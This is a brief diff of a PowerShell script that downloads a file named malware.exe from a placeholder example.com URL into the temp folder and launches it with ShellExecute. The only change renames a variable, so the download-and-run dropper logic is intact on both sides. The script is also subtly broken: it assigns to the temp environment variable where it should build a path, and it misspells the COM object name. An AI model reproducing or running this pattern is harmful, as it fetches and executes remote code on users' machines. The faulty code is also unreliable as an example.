@@ -1,4 +1,4 @@
 $oWC = New-Object System.Net.WebClient;
-$url = 'http://example.com/malware.html';
-$file = $Env:temp = '\malware.exe'; $oWC.DownloadFile($url, $file);
+$uri = 'http://example.com/malware.html';
+$file = $Env:temp = '\malware.exe'; $oWC.DownloadFile($uri, $file);
 $oShell = New-Object -com shell.applicaiton; $oshell.shellexecute($file);
